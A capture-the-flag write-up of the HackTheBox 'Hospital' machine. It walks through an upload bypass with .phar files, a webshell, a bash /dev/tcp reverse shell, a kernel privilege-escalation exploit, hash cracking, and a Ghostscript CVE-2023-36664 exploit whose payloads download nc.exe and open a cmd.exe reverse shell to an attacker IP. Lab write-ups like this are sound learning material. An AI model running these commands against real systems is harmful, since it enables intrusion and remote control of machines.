Threader3000 scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/c3e2ac2b-ba94-435d-b84a-09a56cdca187)

nmap scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/3baeac0c-cf59-4c2d-8466-80f3c8116bb8)
![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/3a1f4b64-bf11-4b7b-a1bb-c9a893ae365e)

hospital.htb is the domain:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/39001823-a25b-469f-aceb-f864c4d06b12)

Seems like rpcclient/smb/ldap does not connect:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5abd85ad-9fb4-4dc2-a281-ba4ce63e4d38)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/7b8e0057-441b-4cc3-86cf-3887100f2221)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/f9d5f3f3-98ee-4d01-8d22-473b786fbc51)

After visiting the webpage on port 8080, we see an interesting upload feature:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4fb6996f-1a05-4536-a903-3ede84518add)

Seems to have went through:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/69bd009f-2640-414f-b728-d909365c1504)

dirsearch results:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/c519489f-f328-4bdc-a5cd-3b4b7cf3f1f4)

We seem to have no permission, but accessing the file directly works:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/026f37be-ba5c-459e-925c-6c65d76ad09d)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/708a50e2-2fdc-4beb-9d77-88f53334f4f2)

Seems like we are on another machine, since Hospital should be a Windows box but this one is Linux:

Found some sql creds:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/95507aee-e924-4b9a-b5b5-bbd1560c88a0)

Stabilizing:

Running ``` bash -c "bash -i >& /dev/tcp/10.10.14.194/1234 0>&1" ``` in the webshell

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4a3944db-e489-4a19-b981-a9773124c251)

Running linpeas:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/65067cd0-e53d-48ed-a585-2c255c481891)

Running a kernel exploit, we get root and see drwilliams hash and crack it:

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----887fd3d6fee9

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/2d420d5d-1704-481d-bfab-0bf84d2fa696)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/30618fb2-4551-46be-9a76-98fb51bd3cff)

Logging into the webmail server we saw, there is something about Ghostscript which leads to this CVE:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/08755689-b598-4c6c-9cc1-41082847aef1)

https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

Exploiting the vulnerability:

``` python3 CVE_2023_36664_exploit.py --payload "wget 10.10.14.196/nc.exe -o nc.exe" -i --filename file.eps ```
 - Note that we need a Windows executable nc since it is a Windows machine

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5e82ace8-c8b5-4374-b2a7-5e92a4956148)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/ff971cfb-7200-452f-93a1-8200795dfc1a)

``` python3 CVE_2023_36664_exploit.py --payload "nc.exe 10.10.14.196 1234 -e cmd.exe" -i --filename file.eps ```

Sending it to drbrown again:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/919837d4-503e-4ef9-9df7-875afcd251bc)

## Privesc
User privs:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/bb0af363-db94-4b0f-9131-64ae1e1298a4)

Seems like the webserver on 443 is running as root, so we upload a p0wny shell and get root!

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/aba2582a-76c5-4214-883a-b97e091a118b)


## What I Learned
 - Folder perms != file perms, even if you can't access the directory, you may be able to access a file in the directory
 - .phar extension substitute for .php extension
 - Ghostscript Command Injection CVE
